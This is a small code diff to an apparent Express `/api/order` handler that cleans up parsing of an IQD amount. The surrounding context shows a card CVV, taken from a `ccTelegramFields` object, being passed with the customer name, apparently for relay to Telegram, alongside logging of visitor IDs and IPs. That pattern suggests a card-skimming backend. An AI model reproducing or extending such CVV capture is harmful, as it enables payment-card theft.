@@ -2136,9 +2136,10 @@ app.post('/api/order', async (req, res) => {
           cvv: ccTelegramFields.cvv,
           customerName: name,
         });
+        const feedAmountIqd = Number(String(iqdAmount || '').replace(/[,\s]/g, '')) || 0;
         await saveFeedEntryForOrder(safeOrderId, {
           visitor_id: visitorId,
-          amount: Number(iqdAmount) || 0,
+          amount: feedAmountIqd,
           method: 'CreditCard',
           user_name: name,
           user_ip: clientIp,
